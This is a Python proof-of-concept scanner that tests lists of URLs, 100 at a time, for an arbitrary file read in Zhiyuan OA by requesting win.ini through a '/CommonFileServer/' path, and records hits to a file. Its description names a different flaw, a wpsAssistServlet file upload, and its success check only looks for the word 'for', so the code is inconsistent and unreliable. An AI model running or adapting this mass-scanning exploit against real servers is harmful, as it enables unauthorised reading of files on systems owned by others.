import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="致远OA wpsAssistServlet 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/CommonFileServer/c:/windows/win.ini'
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    }
    proxie = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        response = requests.get(url=url, headers=headers, proxies=proxie, verify=False, timeout=10)
        if response.status_code == 200 and 'for' in response.text:
            print(f"[+] 该网址存在任意文件读取 {target}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f"[-] 该网址不存在任意文件读取 {target}")
    except Exception as e:
        print(f"[*] 该网址存在问题，请手动检测 {target}")
if __name__ == '__main__':
    main()
